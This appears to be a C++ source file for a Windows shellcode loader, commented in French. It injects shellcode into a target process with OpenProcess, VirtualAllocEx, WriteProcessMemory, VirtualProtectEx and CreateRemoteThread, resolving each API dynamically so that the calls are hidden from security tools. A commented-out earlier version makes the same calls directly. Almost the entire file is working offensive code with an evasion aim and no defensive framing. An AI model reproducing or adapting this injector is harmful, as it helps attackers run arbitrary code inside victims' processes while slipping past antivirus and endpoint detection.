#include <iostream>
#include <stdio.h>
#include <Windows.h>
#include <tchar.h>

#include "Decrypt.h"
#include "DynamicInvoke.h"
#include "HTTPClient.h"
#include "Memory.h"  

// On veut masquer openprocess et virtualalloc
// Fonction pour injecter le shellcode dans le processus local
bool injectShellcode(LPVOID shellcode, SIZE_T shellcodeSize, DWORD targetPid) {
    // �tape 1 : Masquer l'appel � OpenProcess
    typedef HANDLE(WINAPI* OpenProcess_t)(DWORD, BOOL, DWORD);
    OpenProcess_t myOpenProcess = (OpenProcess_t)GetDynamicFunctionFromModule("kernel32.dll", "OpenProcess");

    HANDLE hProcess = myOpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (hProcess == NULL) {
        std::cerr << "Erreur : Impossible d'ouvrir le processus cible !" << std::endl;
        return false;
    }
    std::cout << "Processus cible ouvert avec succ�s." << std::endl;

    // �tape 2 : Masquer l'appel � VirtualAllocEx
    typedef LPVOID(WINAPI* VirtualAllocEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    VirtualAllocEx_t myVirtualAllocEx = (VirtualAllocEx_t)GetDynamicFunctionFromModule("kernel32.dll", "VirtualAllocEx");

    LPVOID remoteAddr = myVirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (remoteAddr == NULL) {
        std::cerr << "Erreur : �chec de l'allocation m�moire dans le processus !" << std::endl;

        // Lib�rer les ressources
        typedef BOOL(WINAPI* CloseHandle_t)(HANDLE);
        CloseHandle_t myCloseHandle = (CloseHandle_t)GetDynamicFunctionFromModule("kernel32.dll", "CloseHandle");
        myCloseHandle(hProcess);

        return false;
    }
    std::cout << "M�moire allou�e � distance � l'adresse : " << remoteAddr << std::endl;

    // �tape 3 : Masquer l'appel � WriteProcessMemory
    typedef BOOL(WINAPI* WriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    WriteProcessMemory_t myWriteProcessMemory = (WriteProcessMemory_t)GetDynamicFunctionFromModule("kernel32.dll", "WriteProcessMemory");

    SIZE_T bytesWritten;
    BOOL success = myWriteProcessMemory(hProcess, remoteAddr, shellcode, shellcodeSize, &bytesWritten);
    if (!success || bytesWritten != shellcodeSize) {
        std::cerr << "Erreur : �chec de l'�criture du shellcode dans la m�moire !" << std::endl;

        // Lib�rer les ressources
        typedef BOOL(WINAPI* VirtualFreeEx_t)(HANDLE, LPVOID, SIZE_T, DWORD);
        VirtualFreeEx_t myVirtualFreeEx = (VirtualFreeEx_t)GetDynamicFunctionFromModule("kernel32.dll", "VirtualFreeEx");
        myVirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);

        typedef BOOL(WINAPI* CloseHandle_t)(HANDLE);
        CloseHandle_t myCloseHandle = (CloseHandle_t)GetDynamicFunctionFromModule("kernel32.dll", "CloseHandle");
        myCloseHandle(hProcess);

        return false;
    }
    std::cout << "Shellcode �crit avec succ�s dans la m�moire." << std::endl;

    // �tape 4 : Masquer l'appel � VirtualProtectEx
    typedef BOOL(WINAPI* VirtualProtectEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD*);
    VirtualProtectEx_t myVirtualProtectEx = (VirtualProtectEx_t)GetDynamicFunctionFromModule("kernel32.dll", "VirtualProtectEx");

    DWORD oldProtect;
    if (!myVirtualProtectEx(hProcess, remoteAddr, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "Erreur : �chec de VirtualProtectEx pour rendre la m�moire ex�cutable !" << std::endl;

        // Lib�rer les ressources
        typedef BOOL(WINAPI* VirtualFreeEx_t)(HANDLE, LPVOID, SIZE_T, DWORD);
        VirtualFreeEx_t myVirtualFreeEx = (VirtualFreeEx_t)GetDynamicFunctionFromModule("kernel32.dll", "VirtualFreeEx");
        myVirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);

        typedef BOOL(WINAPI* CloseHandle_t)(HANDLE);
        CloseHandle_t myCloseHandle = (CloseHandle_t)GetDynamicFunctionFromModule("kernel32.dll", "CloseHandle");
        myCloseHandle(hProcess);

        return false;
    }
    std::cout << "Permissions chang�es en PAGE_EXECUTE_READ." << std::endl;

    // �tape 5 : Masquer l'appel � CreateRemoteThread
    typedef HANDLE(WINAPI* CreateRemoteThread_t)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    CreateRemoteThread_t myCreateRemoteThread = (CreateRemoteThread_t)GetDynamicFunctionFromModule("kernel32.dll", "CreateRemoteThread");

    HANDLE hThread = myCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteAddr, NULL, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "Erreur : �chec de CreateRemoteThread dans le processus !" << std::endl;

        // Lib�rer les ressources
        typedef BOOL(WINAPI* VirtualFreeEx_t)(HANDLE, LPVOID, SIZE_T, DWORD);
        VirtualFreeEx_t myVirtualFreeEx = (VirtualFreeEx_t)GetDynamicFunctionFromModule("kernel32.dll", "VirtualFreeEx");
        myVirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);

        typedef BOOL(WINAPI* CloseHandle_t)(HANDLE);
        CloseHandle_t myCloseHandle = (CloseHandle_t)GetDynamicFunctionFromModule("kernel32.dll", "CloseHandle");
        myCloseHandle(hProcess);

        return false;
    }
    std::cout << "Thread cr�� avec succ�s dans le processus." << std::endl;

    // Attendre que le thread distant termine
    typedef DWORD(WINAPI* WaitForSingleObject_t)(HANDLE, DWORD);
    WaitForSingleObject_t myWaitForSingleObject = (WaitForSingleObject_t)GetDynamicFunctionFromModule("kernel32.dll", "WaitForSingleObject");
    myWaitForSingleObject(hThread, INFINITE);
    std::cout << "Le shellcode a �t� ex�cut� dans le processus." << std::endl;

    // Lib�rer les ressources
    typedef BOOL(WINAPI* CloseHandle_t)(HANDLE);
    CloseHandle_t myCloseHandle = (CloseHandle_t)GetDynamicFunctionFromModule("kernel32.dll", "CloseHandle");

    myCloseHandle(hThread);
    myCloseHandle(hProcess);

    return true;
}

/* Version d'avant : 
// Fonction pour injecter le shellcode dans le processus local
bool injectShellcode(LPVOID shellcode, SIZE_T shellcodeSize, DWORD targetPid) {
    // �tape 1 : Ouvrir le processus cible
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (hProcess == NULL) {
        std::cerr << "Erreur : Impossible d'ouvrir le processus cible !" << std::endl;
        return false;
    }
    std::cout << "Processus cible ouvert avec succ�s." << std::endl;

    // �tape 2 : Allouer de la m�moire dans le processus distant
    LPVOID remoteAddr = VirtualAllocEx(
        hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (remoteAddr == NULL) {
        std::cerr << "Erreur : �chec de l'allocation m�moire dans le processus !" << std::endl;
        CloseHandle(hProcess);
        return false;
    }
    std::cout << "M�moire allou�e � distance � l'adresse : " << remoteAddr << std::endl;

    // �tape 3 : �crire le shellcode dans la m�moire allou�e
    SIZE_T bytesWritten;
    BOOL success = WriteProcessMemory(
        hProcess,
        remoteAddr,
        shellcode,
        shellcodeSize,
        &bytesWritten
    );
    if (!success || bytesWritten != shellcodeSize) {
        std::cerr << "Erreur : �chec de l'�criture du shellcode dans la m�moire !" << std::endl;
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    else {
        std::cout << "Shellcode �crit avec succ�s dans la m�moire." << std::endl;

    }

    // �tape 4 : Modifier les permissions m�moire pour l'ex�cution
    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, remoteAddr, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "Erreur : �chec de VirtualProtectEx pour rendre la m�moire ex�cutable !" << std::endl;
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    std::cout << "Permissions chang�es en PAGE_EXECUTE_READ." << std::endl;


    // �tape 5 : Cr�er un thread pour ex�cuter le shellcode
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remoteAddr,
        NULL,
        0,
        NULL
    );
    if (hThread == NULL) {
        std::cerr << "Erreur : �chec de CreateRemoteThread dans le processus !" << std::endl;
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    std::cout << "Thread cr�� avec succ�s dans le processus." << std::endl;

    
    WaitForSingleObject(hThread, INFINITE);
    std::cout << "Le shellcode a �t� ex�cut� dans le processus." << std::endl;

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}
*/
